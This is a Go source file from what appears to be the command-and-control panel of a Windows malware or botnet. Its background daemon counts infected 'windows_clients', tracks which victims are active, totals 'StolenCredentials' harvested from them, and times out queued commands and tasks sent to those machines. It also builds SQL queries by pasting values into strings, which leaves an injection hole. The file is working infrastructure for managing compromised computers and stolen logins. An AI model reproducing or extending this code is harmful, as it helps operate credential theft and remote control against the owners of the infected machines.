package core

import (
	"encoding/base64"
	"strconv"
	"strings"
	"time"
)

func Daemon() { //Handle background stuff like counts and filters
	for {
		//load current settings
		decodedKey, _ := base64.RawURLEncoding.DecodeString(GetSpecificSQL("settings", "Value", "Name", "EncryptionKey"))
		EncryptionPassword = string(decodedKey)
		decodedUA, _ := base64.RawURLEncoding.DecodeString(GetSpecificSQL("settings", "Value", "Name", "UserAgent"))
		UserAgent = string(decodedUA)
		decodedName, _ := base64.RawURLEncoding.DecodeString(GetSpecificSQL("settings", "Value", "Name", "Name"))
		Name = string(decodedName)
		//Total Clients
		TotalClients = countRows("windows_clients")
		//Active Clients
		Timeout = GetSpecificSQL("settings", "Value", "Name", "ActiveClient")
		i, _ := strconv.ParseFloat(Timeout, 32)
		ActiveClients = 0
		var ClientUID, ClientLS string
		rows, _ := DB.Query("SELECT UID, LastResponse FROM windows_clients")
		for rows.Next() {
			_ = rows.Scan(&ClientUID, &ClientLS)
			then, _ := time.Parse("02 Jan 06 15:04 -0700", ClientLS)
			duration := time.Since(then)
			if duration.Minutes() <= i {
				ActiveClients++
			}
		}
		//Calculate Total Stolen Passwords/Logins
		StolenCredentials = 0
		var PasswordCount string
		rows, _ = DB.Query("SELECT PasswordCount FROM windows_clients")
		for rows.Next() {
			_ = rows.Scan(&PasswordCount)
			i, _ := strconv.Atoi(PasswordCount)
			StolenCredentials = StolenCredentials + i
		}
		//Handle timed out commands
		var id, status, coommand, DateIssued, cTimeout string
		rows, _ = DB.Query("SELECT id, Command, Status, DateIssued, Timeout FROM commands")
		for rows.Next() {
			_ = rows.Scan(&id, &coommand, &status, &DateIssued, &cTimeout)
			if status == "Waiting" {
				if strings.Contains(coommand, "[TASK]") {
					cmdTimeout, _ := time.Parse("02 Jan 06 15:04 -0700", cTimeout)
					Now, _ := time.Parse("02 Jan 06 15:04 -0700", time.Now().Format("02 Jan 06 15:04 -0700"))
					if Now.After(cmdTimeout) {
						_, _ = DB.Exec("UPDATE `commands` SET `Status`='Timed Out' WHERE id='" + id + "'")
					}
				} else {
					then, _ := time.Parse("02 Jan 06 15:04 -0700", DateIssued)
					duration := time.Since(then)
					i, _ := strconv.ParseFloat(cTimeout, 32)
					if duration.Minutes() >= i {
						_, _ = DB.Exec("UPDATE `commands` SET `Status`='Timed Out' WHERE id='" + id + "'")
					}
				}
			}

		}
		time.Sleep(15 * time.Second)
	}
}
